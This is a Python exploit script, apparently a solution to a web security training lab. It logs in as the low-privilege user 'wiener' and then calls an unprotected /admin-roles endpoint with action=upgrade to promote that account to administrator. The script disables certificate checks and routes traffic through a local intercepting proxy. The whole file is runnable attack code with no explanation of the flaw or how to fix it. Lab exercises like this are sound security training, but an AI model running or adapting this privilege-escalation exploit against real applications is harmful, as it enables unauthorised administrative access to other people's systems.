import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def promote_to_admin(s, url):

    # login as the wiener user
    login_url = url + "/login"
    data_login = {"username": "wiener", "password": "peter"}

    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user.")

        # Exploit access control vulnerability to promote the user to admin
        admin_roles_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(admin_roles_url, verify=False, proxies=proxies)
        res = r.text
        if "Admin panel" in res:
            print("(+) Successfully promoted the user to administrator.")
        else:
            print("(-) Could not promote the user to administrator.")
            sys.exit(-1)
    else:
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    promote_to_admin(s, url)

if __name__ == "__main__":
    main()